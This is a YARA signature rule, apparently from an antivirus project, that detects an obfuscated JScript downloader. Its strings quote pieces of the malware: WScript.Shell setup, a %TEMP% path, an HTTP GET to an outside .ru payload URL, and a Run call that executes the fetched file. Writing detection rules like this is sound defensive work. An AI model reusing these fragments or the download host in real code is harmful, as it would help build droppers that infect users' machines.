rule sig_20160427_c811b0cd96d10f6f610d677100484fce {
  meta:
    description = "datamaliciousorder - file 20160427_c811b0cd96d10f6f610d677100484fce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bc09f01042091a147d5b08b83d00534f66d20a32924ce7efcc58687d9bd53da2"

  strings:
    $s1  = "function RsqbhAwykt() {return HwcwyNmqyn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fwzZtI4" ascii
    $s2  = "function RsqbhAwykt() {return HwcwyNmqyn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fwzZtI4" ascii
    $s3  = "function AxuwsQsyyz(KcpneSifwc, OqlocUzpfy){LujfkLwqga = LujfkLwqga * 1; return KcpneSifwc - OqlocUzpfy;};" fullword ascii
    $s4  = "var HwcwyNmqyn = function XjriqMewjn() {return HwbgdOnjvc[GynsvMfqjq](\"WScript\"+\".Shell\");}(), IyccjNisgu = 11;" fullword ascii
    $s5  = "BxwaeAqwuc[DyhcwRkuzz](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var HwbgdOnjvc = this[\"WScript\"];" fullword ascii
    $s7  = "function NvtelOgmtm()" fullword ascii
    $s8  = "function MimvaWlvfk(){return VerxuMbwmf + \"\";};" fullword ascii
    $s9  = "if (BxwaeAqwuc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function SjasaJpdiy() {return ((FkbnbQsyqh == true) && (FkbnbQsyqh == McbitLouee)) ? 1 : LujfkLwqga;};" fullword ascii
    $s11 = "function XxbjvVewvz(OcockBrpxi) {var MdvsjSztkv = (1, 2, 3, 4, 5, OcockBrpxi); return MdvsjSztkv;};" fullword ascii
    $s12 = "function HogdtSfsyl(){return GynsvMfqjq;};" fullword ascii
    $s13 = "var UkuggOrfwa = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var CdjjlZqwtb = false;" fullword ascii
    $s15 = "var FkbnbQsyqh = false;" fullword ascii
    $s16 = "McbitLouee = true; " fullword ascii
    $s17 = "function QwhecXowpq(){return 23;};" fullword ascii
    $s18 = "var McbitLouee = false;" fullword ascii
    $s19 = "}while (EselpNtmro);" fullword ascii
    $s20 = "function TbsakToiuw(LcyisXmzzb){HwcwyNmqyn[\"R\"+\"un\"](LcyisXmzzb, LujfkLwqga, LujfkLwqga);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}